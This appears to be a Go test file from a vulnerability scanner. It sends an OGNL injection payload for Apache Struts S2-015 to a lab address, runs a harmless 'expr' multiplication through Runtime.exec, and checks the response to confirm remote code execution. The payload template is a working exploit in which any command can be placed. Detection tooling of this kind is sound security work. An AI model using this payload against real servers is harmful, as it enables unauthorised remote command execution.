package test

import (
	"fmt"
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strconv"
	"strings"
	"testing"
)

func TestS2015(t *testing.T) {
	rand1 := tool.GetRandomInt()
	rand2 := tool.GetRandomInt()
	cmd := "expr __rand_1__ * __rand_2__"
	cmd = strings.ReplaceAll(cmd, "__rand_1__", strconv.Itoa(rand1))
	cmd = strings.ReplaceAll(cmd, "__rand_2__", strconv.Itoa(rand2))
	payload := "/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExec" +
		"ution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.g" +
		"etDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAc" +
		"cessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23" +
		"q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime" +
		"@getRuntime%28%29.exec%28%27__cmd__%27%29.getInputStream%28%29%2" +
		"9%2C%23q%7D.action"
	payload = strings.ReplaceAll(payload, "__cmd__", cmd)
	output := tool.FormatPayload(payload)
	log.Info("payload: %s", output)
	req := &http.Request{
		Url:    http.NewUrl("http://192.168.222.132:8080" + payload),
		Method: "GET",
	}
	resp := http.DoRequest(req)
	fmt.Println(string(resp.Body))
	if strings.Contains(string(resp.Body), strconv.Itoa(rand1*rand2)) {
		log.Info("find S2-015")
	}

}
